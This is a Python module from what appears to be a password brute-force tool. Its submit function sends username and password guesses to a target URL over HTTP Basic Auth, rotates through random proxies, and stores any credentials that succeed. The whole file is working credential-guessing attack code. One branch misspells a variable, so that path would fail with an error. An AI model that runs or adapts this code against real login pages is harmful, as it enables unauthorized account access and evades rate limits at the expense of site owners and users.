from libs.mbrowser import mBrowser
from utils.utils import printf, die
from cores.actions import randomFromList

# https://stackoverflow.com/a/4089075

def submit(options, loginInfo, creds, result):
	tryPassword, tryUsername = creds
	realm = loginInfo[0]
	fPassword, fUsername = loginInfo[1]
	for cred in list(result.queue):
		if tryUsername == cred[0]:
			return True # don't run if find password of username
	
	try:
		proc = mBrowser()
		if options.proxy:
			proxyAddr = randomFromList(options.proxy)
			proc.setproxy(proxyAddr)
		else:
			proxyAddr = ""
		# proc.httpget_passwd(options.url, tryUsername, tryPassword, realm) # BUG
		resp = proc.get(options.url, auth=(tryUsername, tryPassword))
		if options.verbose:
			if options.proxy:
				printf("[+] [%s=(%s); %s=(%s)] %s" %(fUsername, tryUsername, fPassword, tryPassword, proxyAddr), 'norm')

		if resp.status_code == 401:
			if options.verbose:
				if options.proxy:
					printf("[-] Failed [%s=(%s); %s=(%s)] %s" %(fUsername, tryUsername, fPassword, tryPassword, proxyAddr), 'bad')
		elif resp.status_code == 403:
			printf("[x] Access Denied [%s:%s] %s" %(tryUsername, tryPassword, proxyAddr), "bad")
		elif resp.status_code == 404:
			printf("[x] Link not found [%s:%s] %s" %(tryUsername, tryPassword, proxyAddr), "bad")
		elif resp.status_code >= 500:
			printf("[x] %s Server error [%s:%s] %s" %(resp.status_code, tryUsername, tryPassowrd, proxyAddr) )
		else:
			printf("[*] Found [%s:%s] [%s]" %(tryUsername, tryPassword, proc.get_title()), "good")
			result.put([options.url, tryUsername, tryPassword])

	except Exception as err:
		die("[x] HTTP GET:", err)